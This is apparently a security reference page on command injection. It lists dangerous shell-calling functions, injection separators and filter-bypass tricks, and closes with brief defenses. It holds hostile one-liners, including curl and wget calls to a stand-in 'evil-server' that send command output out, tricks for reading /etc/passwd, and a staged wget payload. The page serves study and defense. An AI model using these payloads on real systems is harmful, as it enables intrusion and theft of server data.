command injection
========================================

Introduction
----------------------------------------
Command injection usually refers to vulnerabilities caused by web applications splicing system commands on the server.

This type of vulnerability usually occurs when external programs are called to complete some functions. For example, some web management interfaces have functions such as configuring host name/IP/mask/gateway, viewing system information, and shutting down and restarting, or some sites provide functions such as ping, nslookup, sending emails, converting pictures, etc. This type of vulnerability may appear.

Common dangerous functions
----------------------------------------

PHP
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- system
- exec
- passthru
- shell_exec
- popen
- proc_open

Python
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- system
- popen
- subprocess.call
- spawn

Java
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- java.lang.Runtime.getRuntime().exec(command)

Common injection methods
----------------------------------------
- Semicolon separation
- ``||`` ``&&`` ``&`` split
- ``|`` pipe character
- ``\r\n`` ``%d0%a0`` Newline
- Backtick parsing
- ``$()`` replacement

No echo technique
----------------------------------------
- bash rebound shell
- DNS out-of-band data
- http out of band
    - ``curl http://evil-server/$(whoami)``
    - ``wget http://evil-server/$(whoami)``
- Use ``sleep`` or other logic to construct Boolean conditions when there is no out-of-band

Common bypass methods
----------------------------------------

Space bypass
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``<`` symbol ``cat<123``
- ``\t`` / ``%09``
- ``${IFS}`` where {} is used for truncation. For example, cat$IFS2 will be considered as IFS2 as a variable name. In addition, adding a $ at the end can play a truncation effect. Generally, $9 is used, because $9 is the holder of the ninth parameter of the current system shell process, and it is always an empty string.

Blacklist bypass
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``a=l;b=s;$a$b``
- base64 ``echo "bHM=" | base64 -d``
- ``/?in/?s`` => ``/bin/ls``
- Connector ``cat /etc/pass'w'd``
- Undefined initialization variable ``cat$x /etc/passwd``

Length limit bypass
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

    >wget\
    >foo.\
    >com
    ls -t>a
    sh a

The above method is to write commands through command line redirection, then use ls to write the commands to the file in order of time, and finally execute
If executed directly under the Linux terminal, creating a file requires adding the command before the redirection symbol.
Here you can use some short commands such as w, [ (use ls /usr/bin/? to view)
If you do not add a command, you need Ctrl+D to end it, which is equivalent to redirecting the standard input stream.
In PHP, when using functions such as shell_exec to execute system commands, there is no standard input stream, so files can be created directly.

Common symbols
----------------------------------------

command separator
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``%0a`` / ``%0d`` / ``\n`` / ``\r``
- ``;``
- ``&`` / ``&&``

wildcard
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``*`` any number of characters from 0 to infinity
- ``?`` an arbitrary character
- ``[ ]`` A character within brackets, e.g. ``[abcd]``
- ``[ - ]`` all characters in the encoding sequence
- ``[^ ]`` a character not enclosed in brackets

defense
----------------------------------------
- Disable corresponding functions when not in use
- Try not to execute external applications or commands
- Do format checking of input
- Escape all shell metacharacters in the command
    - Shell metacharacters include ``#&;`,|*?~<>^()[]{}$\``
